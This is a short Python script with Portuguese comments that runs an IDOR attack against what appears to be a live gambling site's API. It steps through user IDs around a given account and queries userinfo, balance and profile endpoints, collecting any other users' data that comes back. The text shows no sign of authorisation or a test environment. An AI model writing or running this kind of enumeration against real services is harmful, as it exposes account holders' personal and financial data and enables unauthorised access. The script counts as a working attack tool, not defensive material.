import requests
import json

API_BASE = "https://vipvip.vip999jogo.com"
# O ID fornecido pelo usuário é 211995351. Vamos testar IDs próximos.
BASE_ID = 211995351

def test_idor():
    print(f"[*] Iniciando Exploração de IDOR na API: {API_BASE}")
    # Endpoints comuns para dados de usuário
    endpoints = [
        "/hall/api/gohal/userinfo",
        "/hall/api/gohal/get_balance",
        "/hall/api/gohal/profile"
    ]
    
    found_data = []
    
    for i in range(-5, 6):
        target_id = BASE_ID + i
        for ep in endpoints:
            url = f"{API_BASE}{ep}?id={target_id}"
            try:
                # Tentando GET e POST (algumas APIs aceitam ambos)
                response = requests.get(url, timeout=5)
                if response.status_code == 200 and len(response.text) > 10:
                    print(f"[!] POSSÍVEL IDOR DETECTADO: {url}")
                    print(f"    Dados: {response.text[:100]}...")
                    found_data.append({"url": url, "data": response.json()})
            except Exception as e:
                continue
                
    return found_data

if __name__ == "__main__":
    results = test_idor()
    if not results:
        print("[-] Nenhum IDOR direto encontrado via GET. Tentando análise de tokens...")
